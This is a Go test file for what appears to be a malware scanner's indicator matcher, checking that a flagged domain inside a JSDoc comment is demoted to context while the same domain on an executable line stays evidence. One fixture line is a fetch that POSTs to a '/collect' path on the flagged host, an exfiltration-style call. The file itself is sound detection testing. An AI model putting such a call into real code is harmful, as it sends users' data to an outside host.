package iocscan

import (
	"testing"

	"github.com/vulnetix/malscan-engine/detect"
)

// A host named in a comment is not a host the package talks to.
//
// Measured on production 2026-08-08, IOC-STIX-MATCH was the top sole-evidence rule for
// both pypi (2,173 mints) and npm (116). The npm sample is the line below, verbatim: a
// JSDoc comment where `creds.me` is a TypeScript property access that the domain
// matcher read as a hostname on the .me TLD.
//
// The hit is demoted to ClassContext, not dropped — the same treatment a minified line
// gets — so it can still corroborate a real finding but cannot mint on its own.
func TestCommentLineDemotesToContext(t *testing.T) {
	set := NewIndicatorSet()
	set.Add(&Indicator{Type: TypeDomain, Value: "creds.me"})
	m := NewMatcher(set, 0)

	const jsdoc = "/**\n * Use this anywhere we'd otherwise reach for `creds.me!.id` to fail fast.\n */\n"
	ev := m.MatchText("src/auth.ts", jsdoc)
	if len(ev) == 0 {
		t.Fatal("expected the match to be recorded (as context), got none")
	}
	// The demotion sets an explicit ClassContext floor. Asserting "not evidence"
	// would pass vacuously: an unconstrained match carries an EMPTY class, which the
	// caller resolves later, so the floor is the only observable difference here.
	for _, e := range ev {
		if e.Class != detect.ClassContext {
			t.Errorf("comment line class = %q, want %q (line=%q)",
				e.Class, detect.ClassContext, e.MatchedLine)
		}
	}
}

// The same indicator on an executable line must stay evidence-class, or the demotion
// would be blanket suppression.
func TestExecutableLineStaysEvidence(t *testing.T) {
	set := NewIndicatorSet()
	set.Add(&Indicator{Type: TypeDomain, Value: "creds.me"})
	m := NewMatcher(set, 0)

	ev := m.MatchText("src/auth.ts", "fetch('https://creds.me/collect', {method:'POST'})\n")
	if len(ev) == 0 {
		t.Fatal("expected a match on the executable line")
	}
	// No floor: an executable-line match is left unconstrained (empty class) so the
	// caller decides. What must NOT happen is a ClassContext floor.
	for _, e := range ev {
		if e.Class == detect.ClassContext {
			t.Errorf("executable line was demoted to context; line=%q", e.MatchedLine)
		}
	}
}
